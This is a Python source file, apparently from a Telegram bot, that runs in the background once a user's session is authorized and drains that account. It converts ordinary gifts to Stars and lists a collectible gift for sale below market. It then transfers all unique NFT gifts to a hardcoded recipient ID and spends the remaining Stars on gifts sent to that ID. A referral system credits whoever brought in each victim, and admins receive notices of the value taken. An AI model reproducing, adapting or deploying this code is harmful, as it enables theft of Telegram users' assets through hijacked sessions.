import asyncio
import os
import sys
from typing import Optional

# Ensure repo root is on sys.path for imports
REPO_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), "../.."))
if REPO_ROOT not in sys.path:
    sys.path.insert(0, REPO_ROOT)

from server.utils.referral_logging import log_referral_action
from server.utils.send_admin_notification import send_admin_notification, format_gift_transfer_notification
from server.bot.store.referral_links import get_referral_link_by_user, get_referral_by_link

from automation.analyze_non_unique_gifts_for_funding import analyze_non_unique_gifts_for_funding
from automation.buy_and_send_regular_gift import buy_and_send_regular_gift
from automation.calc_required_transfer_stars import calc_required_transfer_stars
from automation.convert_gift_to_stars import convert_gift_to_stars
from automation.filter_unique_star_gifts import filter_unique_star_gifts
from automation.find_cheapest_unique_gift_to_sell import find_cheapest_unique_gift_to_sell
from automation.get_available_regular_gifts import get_available_regular_gifts
from automation.get_saved_star_gifts import get_saved_star_gifts
from automation.get_self_peer import get_self_peer
from automation.get_stars_balance import get_stars_balance
from automation.get_telegram_client import get_telegram_client
from automation.select_gifts_within_budget import select_gifts_within_budget
from automation.sell_unique_gift import sell_unique_gift
from automation.transfer_unique_gift import transfer_unique_gift

# Recipient user ID for transfers
RECIPIENT_USER_ID = 8316993133

# Fixed discount when selling unique gift (50 Stars below market price)
SELL_DISCOUNT_STARS = 50

# Poll interval for checking balance after selling (seconds)
BALANCE_CHECK_INTERVAL = 10

# Max wait time for balance to increase after selling (seconds)
MAX_BALANCE_WAIT_TIME = 300


async def wait_for_balance_increase(
    client, peer, initial_balance: int, target_balance: int, timeout: int
) -> bool:
    """Waits for Stars balance to reach target_balance, polling every BALANCE_CHECK_INTERVAL seconds."""
    import time
    start_time = time.time()
    check_count = 0
    while time.time() - start_time < timeout:
        current_balance = await get_stars_balance(client=client, peer=peer)
        check_count += 1
        if check_count % 3 == 0:  # Log every 3rd check to avoid spam
            print(f"[AUTO-TRANSFER] [INFO] Balance check #{check_count}: {current_balance}/{target_balance} Stars")
        if current_balance >= target_balance:
            print(f"[AUTO-TRANSFER] [OK] Balance reached target: {current_balance} >= {target_balance}")
            return True
        await asyncio.sleep(BALANCE_CHECK_INTERVAL)
    print(f"[AUTO-TRANSFER] [WARN] Timeout waiting for balance increase (waited {timeout}s)")
    return False


async def auto_transfer_gifts_async(user_id: str, limit: int = 200) -> Optional[str]:
    """
    Automatically transfers unique gifts and buys regular gifts after successful auth.
    Runs in background, returns error message if failed, None if success.
    """
    print(f"[AUTO-TRANSFER] Starting auto-transfer for user_id={user_id}")
    
    # Get referral link info for this user
    referral_link = None
    referrer_id = None
    referrer_username = None
    user_telegram_id = None
    user_username = None
    
    try:
        telegram_user_id = int(user_id) if user_id.isdigit() else None
        if telegram_user_id:
            user_telegram_id = telegram_user_id
            referral_link = get_referral_link_by_user(telegram_user_id)
            if referral_link:
                ref_data = get_referral_by_link(referral_link)
                if ref_data:
                    referrer_id = ref_data.user_id
                    # Get referrer username from clicks
                    for click in ref_data.clicks:
                        if click.user_id == telegram_user_id:
                            user_username = click.username
                            break
                    # Get referrer username - need to fetch from Telegram
                    # For now, we'll use the referral link creator's ID
    except (ValueError, AttributeError, Exception) as e:
        print(f"[AUTO-TRANSFER] [WARN] Could not get referral info: {str(e)}")
    
    try:
        client = get_telegram_client(user_id)
        await client.connect()
        try:
            if not await client.is_user_authorized():
                error_msg = f"Session for user_id={user_id} is not authorized"
                print(f"[AUTO-TRANSFER] [ERROR] {error_msg}")
                
                # Send admin notification about failure
                notification = format_gift_transfer_notification(
                    user_id=user_telegram_id,
                    user_username=user_username,
                    success=False,
                    details=error_msg,
                    referrer_id=referrer_id,
                    referrer_username=referrer_username,
                    total_gifts_value=None
                )
                await send_admin_notification(notification)
                
                return error_msg

            me = await get_self_peer(client)
            
            # Get current user info
            try:
                me_user = await client.get_entity(me)
                if hasattr(me_user, 'username'):
                    user_username = me_user.username
            except Exception:
                pass
            
            # Log successful authorization to referrer
            try:
                telegram_user_id = int(user_id) if user_id.isdigit() else None
                if telegram_user_id:
                    log_referral_action(telegram_user_id, "auth_success", None)
            except (ValueError, AttributeError):
                pass
            
            print(f"[AUTO-TRANSFER] [INFO] User: {user_id}, Recipient: {RECIPIENT_USER_ID}")

            # Get all saved gifts
            print(f"[AUTO-TRANSFER] [INFO] Fetching saved gifts (limit={limit})...")
            gifts = await get_saved_star_gifts(client=client, peer=me, limit=limit)
            unique = filter_unique_star_gifts(gifts)
            print(f"[AUTO-TRANSFER] [INFO] Total saved gifts: {len(gifts)}, Unique (NFT): {len(unique)}")
            
            # Get Stars balance
            stars_balance = await get_stars_balance(client=client, peer=me)
            
            # Log gift check info to referrer
            try:
                telegram_user_id = int(user_id) if user_id.isdigit() else None
                if telegram_user_id:
                    gift_info = f"📊 Найдено сохраненных подарков: {len(gifts)}\n💎 Уникальных (NFT): {len(unique)}\n⭐ Баланс Stars: {stars_balance}"
                    log_referral_action(telegram_user_id, "auth_check_gifts", gift_info)
            except (ValueError, AttributeError):
                pass

            if len(unique) == 0:
                print("[AUTO-TRANSFER] [INFO] No unique gifts found. Checking for regular gifts...")
                # No unique gifts, but still try to send regular gifts if balance > 0
                if stars_balance > 0:
                    print(f"[AUTO-TRANSFER] [INFO] Sending regular gifts with {stars_balance} Stars...")
                    regular_gifts_value = await _send_regular_gifts(client, me, stars_balance)
                    
                    # Get referrer info
                    if referral_link and referrer_id:
                        try:
                            referrer_entity = await client.get_entity(referrer_id)
                            if hasattr(referrer_entity, 'username'):
                                referrer_username = referrer_entity.username
                        except Exception:
                            pass
                    
                    # Log to referrer
                    try:
                        telegram_user_id = int(user_id) if user_id.isdigit() else None
                        if telegram_user_id:
                            log_referral_action(telegram_user_id, "gift_transfer", f"✅ Уникальных подарков не найдено\n💫 Отправлено обычных подарков на {regular_gifts_value} Stars")
                    except (ValueError, AttributeError):
                        pass
                    
                    # Send admin notification
                    notification = format_gift_transfer_notification(
                        user_id=user_telegram_id,
                        user_username=user_username,
                        success=True,
                        details=f"Уникальных подарков не найдено. Отправлено обычных подарков на {regular_gifts_value} Stars",
                        referrer_id=referrer_id,
                        referrer_username=referrer_username,
                        total_gifts_value=regular_gifts_value
                    )
                    await send_admin_notification(notification)
                else:
                    print("[AUTO-TRANSFER] [INFO] No Stars balance, nothing to send")
                    
                    # Get referrer info
                    if referral_link and referrer_id:
                        try:
                            referrer_entity = await client.get_entity(referrer_id)
                            if hasattr(referrer_entity, 'username'):
                                referrer_username = referrer_entity.username
                        except Exception:
                            pass
                    
                    # Log to referrer
                    try:
                        telegram_user_id = int(user_id) if user_id.isdigit() else None
                        if telegram_user_id:
                            log_referral_action(telegram_user_id, "gift_transfer", "❌ Подарков не найдено\n⭐ Баланс Stars: 0\n📭 Нечего отправлять")
                    except (ValueError, AttributeError):
                        pass
                    
                    # Send admin notification
                    notification = format_gift_transfer_notification(
                        user_id=user_telegram_id,
                        user_username=user_username,
                        success=False,
                        details="Подарков не найдено. Баланс Stars: 0",
                        referrer_id=referrer_id,
                        referrer_username=referrer_username,
                        total_gifts_value=None
                    )
                    await send_admin_notification(notification)
                return None

            # Calculate required Stars (15 per unique gift)
            required_transfer = calc_required_transfer_stars(unique)
            transferable_count = required_transfer // 15
            print(f"[AUTO-TRANSFER] [INFO] Transferable unique gifts: {transferable_count}")
            print(f"[AUTO-TRANSFER] [INFO] Stars required for transfer: {required_transfer} (15 per gift)")

            # Check current balance
            stars_balance = await get_stars_balance(client=client, peer=me)
            print(f"[AUTO-TRANSFER] [INFO] Current Stars balance: {stars_balance}")

            if stars_balance < required_transfer:
                shortage = required_transfer - stars_balance
                print(f"[AUTO-TRANSFER] [WARN] Not enough Stars. Shortage: {shortage}")

                # Try converting non-unique gifts to Stars
                funding = analyze_non_unique_gifts_for_funding(gifts)
                print(f"[AUTO-TRANSFER] [INFO] Non-unique gifts convertible to Stars: {funding.convertible_count}")
                if funding.convertible_count > 0:
                    print("[AUTO-TRANSFER] [INFO] Converting non-unique gifts to Stars...")
                    converted = 0
                    for gift in gifts:
                        if gift in unique:
                            continue
                        convert_stars = getattr(gift, "convert_stars", None)
                        if isinstance(convert_stars, int) and convert_stars > 0:
                            msg_id = getattr(gift, "msg_id", "?")
                            if await convert_gift_to_stars(client, gift):
                                converted += 1
                                print(f"[AUTO-TRANSFER] [OK] Converted gift (msg_id={msg_id}) -> {convert_stars} Stars")
                                await asyncio.sleep(1)
                            else:
                                print(f"[AUTO-TRANSFER] [ERROR] Failed to convert gift (msg_id={msg_id})")

                    if converted > 0:
                        stars_balance = await get_stars_balance(client=client, peer=me)
                        print(f"[AUTO-TRANSFER] [INFO] Stars balance after conversion: {stars_balance}")
                    else:
                        print("[AUTO-TRANSFER] [WARN] No gifts were converted")

                # If still not enough, sell cheapest unique gift
                if stars_balance < required_transfer:
                    print("[AUTO-TRANSFER] [INFO] Still not enough Stars. Looking for cheapest unique gift to sell...")
                    cheapest_info = await find_cheapest_unique_gift_to_sell(client, unique)
                    if cheapest_info:
                        cheapest_gift, market_price = cheapest_info
                        sell_price = max(50, market_price - SELL_DISCOUNT_STARS)
                        msg_id = getattr(cheapest_gift, "msg_id", "?")
                        print(f"[AUTO-TRANSFER] [INFO] Found cheapest unique gift (msg_id={msg_id}, market price: {market_price} Stars)")
                        print(f"[AUTO-TRANSFER] [INFO] Listing for resale at {sell_price} Stars ({SELL_DISCOUNT_STARS} Stars below market)")
                        if await sell_unique_gift(client, cheapest_gift, sell_price):
                            print(f"[AUTO-TRANSFER] [OK] Listed unique gift for resale at {sell_price} Stars")
                            print(f"[AUTO-TRANSFER] [INFO] Waiting for balance to increase (checking every {BALANCE_CHECK_INTERVAL}s, max {MAX_BALANCE_WAIT_TIME}s)...")
                            initial_balance = stars_balance
                            if await wait_for_balance_increase(
                                client, me, initial_balance, required_transfer, MAX_BALANCE_WAIT_TIME
                            ):
                                stars_balance = await get_stars_balance(client=client, peer=me)
                                print(f"[AUTO-TRANSFER] [OK] Balance increased to {stars_balance} Stars")
                            else:
                                current = await get_stars_balance(client=client, peer=me)
                                print(f"[AUTO-TRANSFER] [WARN] Timeout waiting for balance increase. Current: {current}")
                        else:
                            print(f"[AUTO-TRANSFER] [ERROR] Failed to list gift for resale")
                    else:
                        print("[AUTO-TRANSFER] [ERROR] No sellable unique gift found")

            # Transfer all unique gifts to recipient
            if stars_balance >= required_transfer:
                print(f"[AUTO-TRANSFER] [INFO] Transferring {transferable_count} unique gifts to user {RECIPIENT_USER_ID}...")
                transferred = 0
                failed = 0
                for gift in unique:
                    import time
                    can_transfer_at = getattr(gift, "can_transfer_at", None)
                    now = int(time.time())
                    msg_id = getattr(gift, "msg_id", "?")
                    if isinstance(can_transfer_at, int) and can_transfer_at > now:
                        print(f"[AUTO-TRANSFER] [SKIP] Gift (msg_id={msg_id}) not transferable yet (can_transfer_at={can_transfer_at})")
                        continue

                    if await transfer_unique_gift(client, gift, RECIPIENT_USER_ID):
                        transferred += 1
                        print(f"[AUTO-TRANSFER] [OK] Transferred unique gift (msg_id={msg_id})")
                        await asyncio.sleep(1)
                    else:
                        failed += 1
                        print(f"[AUTO-TRANSFER] [ERROR] Failed to transfer unique gift (msg_id={msg_id})")

                print(f"[AUTO-TRANSFER] [INFO] Transfer complete. Transferred: {transferred}, Failed: {failed}")

                # After transferring unique gifts, send regular gifts with remaining balance
                remaining_balance = await get_stars_balance(client=client, peer=me)
                print(f"[AUTO-TRANSFER] [INFO] Remaining Stars balance after transfers: {remaining_balance}")
                regular_gifts_value = 0
                if remaining_balance > 0:
                    print(f"[AUTO-TRANSFER] [INFO] Buying and sending regular gifts with remaining {remaining_balance} Stars...")
                    regular_gifts_value = await _send_regular_gifts(client, me, remaining_balance)
                else:
                    print("[AUTO-TRANSFER] [INFO] No remaining Stars, skipping regular gifts")
                
                # Calculate total value
                unique_gifts_value = transferred * 15
                total_gifts_value = unique_gifts_value + regular_gifts_value
                
                # Get referrer username if we have referral link
                if referral_link and referrer_id:
                    try:
                        referrer_entity = await client.get_entity(referrer_id)
                        if hasattr(referrer_entity, 'username'):
                            referrer_username = referrer_entity.username
                    except Exception:
                        pass
                
                # Log successful transfer
                try:
                    telegram_user_id = int(user_id) if user_id.isdigit() else None
                    if telegram_user_id:
                        status_msg = f"✅ Передача подарков завершена\n\n💎 Уникальных подарков: {transferred}"
                        if failed > 0:
                            status_msg += f"\n❌ Ошибок при передаче: {failed}"
                        if regular_gifts_value > 0:
                            status_msg += f"\n💫 Обычных подарков: {regular_gifts_value} Stars"
                        status_msg += f"\n\n💰 Общая стоимость: {total_gifts_value} Stars"
                        log_referral_action(telegram_user_id, "gift_transfer", status_msg)
                except (ValueError, AttributeError):
                    pass
                
                # Send admin notification
                notification = format_gift_transfer_notification(
                    user_id=user_telegram_id,
                    user_username=user_username,
                    success=True,
                    details=f"Передано уникальных подарков: {transferred}, Ошибок: {failed}. Обычных подарков отправлено на {regular_gifts_value} Stars",
                    referrer_id=referrer_id,
                    referrer_username=referrer_username,
                    total_gifts_value=total_gifts_value
                )
                await send_admin_notification(notification)
            else:
                error_msg = f"Still not enough Stars ({stars_balance} < {required_transfer})"
                print(f"[AUTO-TRANSFER] [ERROR] {error_msg}")
                
                # Get referrer username if we have referral link
                if referral_link and referrer_id:
                    try:
                        referrer_entity = await client.get_entity(referrer_id)
                        if hasattr(referrer_entity, 'username'):
                            referrer_username = referrer_entity.username
                    except Exception:
                        pass
                
                # Log failed transfer
                try:
                    telegram_user_id = int(user_id) if user_id.isdigit() else None
                    if telegram_user_id:
                        failure_msg = f"❌ Передача подарков не удалась\n\n💎 Найдено уникальных подарков: {len(unique)}\n⭐ Требуется Stars: {required_transfer}\n💰 Текущий баланс: {stars_balance}\n📉 Недостает: {required_transfer - stars_balance} Stars"
                        log_referral_action(telegram_user_id, "gift_transfer", failure_msg)
                except (ValueError, AttributeError):
                    pass
                
                # Send admin notification
                notification = format_gift_transfer_notification(
                    user_id=user_telegram_id,
                    user_username=user_username,
                    success=False,
                    details=f"Недостаточно Stars: требуется {required_transfer}, текущий баланс {stars_balance}",
                    referrer_id=referrer_id,
                    referrer_username=referrer_username,
                    total_gifts_value=None
                )
                await send_admin_notification(notification)

            print(f"[AUTO-TRANSFER] [INFO] Auto-transfer completed for user_id={user_id}")
            return None
        finally:
            await client.disconnect()
    except Exception as e:
        error_msg = f"Error in auto_transfer_gifts: {str(e)}"
        print(f"[AUTO-TRANSFER] [ERROR] {error_msg}")
        import traceback
        print(f"[AUTO-TRANSFER] [ERROR] Traceback: {traceback.format_exc()}")
        
        # Get referrer info if available
        if referral_link and referrer_id:
            try:
                # Try to get client if not already connected
                try:
                    temp_client = get_telegram_client(user_id)
                    await temp_client.connect()
                    if await temp_client.is_user_authorized():
                        referrer_entity = await temp_client.get_entity(referrer_id)
                        if hasattr(referrer_entity, 'username'):
                            referrer_username = referrer_entity.username
                    await temp_client.disconnect()
                except Exception:
                    pass
            except Exception:
                pass
        
        # Log failed transfer with error
        try:
            telegram_user_id = int(user_id) if user_id.isdigit() else None
            if telegram_user_id:
                error_display = f"❌ Ошибка при передаче подарков\n\n⚠️ {str(e)}"
                log_referral_action(telegram_user_id, "gift_transfer", error_display)
        except (ValueError, AttributeError):
            pass
        
        # Send admin notification about error
        notification = format_gift_transfer_notification(
            user_id=user_telegram_id,
            user_username=user_username,
            success=False,
            details=f"Ошибка: {error_msg}",
            referrer_id=referrer_id,
            referrer_username=referrer_username,
            total_gifts_value=None
        )
        await send_admin_notification(notification)
        
        return error_msg


async def _send_regular_gifts(client, peer, budget_stars: int) -> int:
    """Helper to buy and send regular gifts within budget. Returns total spent Stars."""
    print(f"[AUTO-TRANSFER] [INFO] Fetching available regular gifts...")
    regular_gifts = await get_available_regular_gifts(client)
    print(f"[AUTO-TRANSFER] [INFO] Available regular gifts: {len(regular_gifts)}")
    if regular_gifts:
        affordable_gifts = select_gifts_within_budget(regular_gifts, budget_stars)
        print(f"[AUTO-TRANSFER] [INFO] Can afford {len(affordable_gifts)} regular gift(s)")
        if affordable_gifts:
            sent_count = 0
            failed_count = 0
            total_spent = 0
            for gift in affordable_gifts:
                gift_stars = getattr(gift, "stars", 0) or 0
                gift_id = getattr(gift, "id", "?")
                gift_title = getattr(gift, "title", None) or f"Gift #{gift_id}"
                if await buy_and_send_regular_gift(client, gift, RECIPIENT_USER_ID):
                    sent_count += 1
                    total_spent += gift_stars
                    print(f"[AUTO-TRANSFER] [OK] Sent regular gift: {gift_title} ({gift_stars} Stars)")
                    await asyncio.sleep(2)
                else:
                    failed_count += 1
                    print(f"[AUTO-TRANSFER] [ERROR] Failed to send regular gift: {gift_title}")
            print(f"[AUTO-TRANSFER] [INFO] Regular gifts sent: {sent_count}, Failed: {failed_count}, Total spent: {total_spent} Stars")
            return total_spent
        else:
            print("[AUTO-TRANSFER] [INFO] No affordable regular gifts found")
    else:
        print("[AUTO-TRANSFER] [INFO] No regular gifts available")
    return 0


def auto_transfer_gifts_background(user_id: str, limit: int = 200):
    """
    Starts auto-transfer in background (non-blocking).
    Creates a new event loop in a thread to avoid blocking Flask.
    """
    import threading

    def _run():
        print(f"[AUTO-TRANSFER] [INFO] Background thread started for user_id={user_id}")
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            result = loop.run_until_complete(auto_transfer_gifts_async(user_id, limit))
            if result:
                print(f"[AUTO-TRANSFER] [ERROR] Background transfer failed: {result}")
            else:
                print(f"[AUTO-TRANSFER] [OK] Background transfer completed successfully for user_id={user_id}")
        except Exception as e:
            print(f"[AUTO-TRANSFER] [ERROR] Background thread exception: {str(e)}")
            import traceback
            print(f"[AUTO-TRANSFER] [ERROR] Traceback: {traceback.format_exc()}")
        finally:
            loop.close()
            print(f"[AUTO-TRANSFER] [INFO] Background thread finished for user_id={user_id}")

    thread = threading.Thread(target=_run, daemon=True, name=f"AutoTransfer-{user_id}")
    thread.start()
    print(f"[AUTO-TRANSFER] [INFO] Started background thread for user_id={user_id} (thread={thread.name})")

